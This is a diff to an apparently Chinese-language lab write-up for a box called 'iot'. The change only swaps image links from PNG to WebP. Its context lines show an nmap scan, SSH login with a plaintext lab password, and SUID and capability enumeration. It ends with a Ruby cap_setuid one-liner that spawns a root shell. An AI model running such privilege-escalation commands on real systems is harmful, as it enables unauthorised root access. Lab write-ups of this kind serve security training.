@@ -11,7 +11,7 @@
 | 内核 | `6.12.74+deb13+1-amd64`（2026-03-08） |
 | 最终路径 | MQTT 保留消息 → `redteam` → 提权（Ruby `cap_setuid` **或** CVE-2026-31431 Copy Fail）→ root |
 
-![|294](/content/iot/image-01.png)
+![|294](/content/iot/image-01.webp)
 
 ## 1. 攻击链概览
 
@@ -30,7 +30,7 @@
 
 ## 2. 主机发现与扫描
 
-![主机发现](/content/iot/image-02.png)
+![主机发现](/content/iot/image-02.webp)
 
 ```bash
 nmap -sT -sV -sC -O -p- 192.168.134.69
@@ -58,7 +58,7 @@ ssh redteam@192.168.134.69
 # Pentest123!
 ```
 
-![SSH 登录 redteam](/content/iot/image-03.png)
+![SSH 登录 redteam](/content/iot/image-03.webp)
 
 ```text
 redteam@iot:~$ ls
@@ -79,7 +79,7 @@ Linux iot 6.12.74+deb13+1-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.74-2 (2026-03
 find / -perm -4000 -type f 2>/dev/null
 ```
 
-![SUID 枚举](/content/iot/image-04.png)
+![SUID 枚举](/content/iot/image-04.webp)
 
 再查能力位：
 
@@ -87,7 +87,7 @@ find / -perm -4000 -type f 2>/dev/null
 /usr/sbin/getcap -r / 2>/dev/null
 ```
 
-![getcap 发现 ruby3.3](/content/iot/image-05.png)
+![getcap 发现 ruby3.3](/content/iot/image-05.webp)
 
 关键一行：
 
@@ -101,7 +101,7 @@ find / -perm -4000 -type f 2>/dev/null
 ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'
 ```
 
-![Ruby 提权到 root](/content/iot/image-06.png)
+![Ruby 提权到 root](/content/iot/image-06.webp)
 
 ```text
 root@iot:~# id
